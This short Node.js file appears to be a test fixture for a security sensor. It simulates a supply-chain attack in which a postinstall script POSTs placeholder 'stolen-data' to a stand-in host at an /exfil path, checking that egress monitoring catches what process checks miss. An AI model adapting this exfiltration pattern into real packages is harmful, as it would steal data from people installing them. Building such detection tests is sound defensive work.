// Simulated supply-chain attack:
// Uses Node's own HTTP module to POST stolen data to an external host.
// The process is /usr/local/bin/node (which is allowlisted), so a
// process-tree check alone would miss it. The network egress sensor
// catches the outbound connection to 10.255.255.1:80.
const http = require('http');
const req = http.request(
  { host: '10.255.255.1', port: 80, method: 'POST', path: '/exfil', timeout: 5000 },
  () => {}
);
req.on('error', () => {});
req.on('timeout', () => req.destroy());
req.write('stolen-data');
req.end();
console.log('[postinstall] exfil attempted');
